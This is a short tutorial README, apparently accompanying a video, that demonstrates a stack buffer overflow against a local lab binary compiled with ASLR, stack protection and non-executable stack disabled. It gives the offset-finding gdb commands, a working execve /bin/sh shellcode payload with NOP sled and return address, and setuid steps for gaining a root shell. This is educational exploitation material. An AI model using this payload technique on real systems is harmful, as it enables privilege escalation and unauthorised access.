# Buffer Overflow Exploit 


## YouTube Tutorial 

[![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/bUsHksveXKo/0.jpg)](https://www.youtube.com/watch?v=bUsHksveXKo)

## Step 1: Setup environment

Disable ASLR
```
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

Compile 32-bit program 
```
gcc main.c -o main -fno-stack-protector -m32 -z execstack
```

Download gdb
```
sudo apt install gdb
```

## Step 2: Find next instruction

```
gdb ./main
```

```
r `python -c "print('A'*116)"`
0x41414141 in ?? ()

r `python -c "print('A'*112 + 'BBBB')"`
0x42424242 in ?? ()
```

## Step 3: Place shellcode

Buffer: 112 bytes

Shellcode: 53 bytes

NOP Sled: 112 - 53 = 59 bytes

Return address: 4 bytes


```
r `python -c "print('\x90'*59 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + 'BCDE')"`

0x45444342 in ?? () --> EDCB

```

Find address with NOP instruction (middle)

```
0x ff ff d6 7c
Convert to little endian
0x 7c d6 ff ff
```

## Step 4: Adjust address to run outside of gdb
```
`python -c "print('\x90'*59 + '\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x7c\xd6\xff\xff')"`
```


## Step 5: Change permissions 
```
sudo chown root:root main
sudo chmod u+s main
```
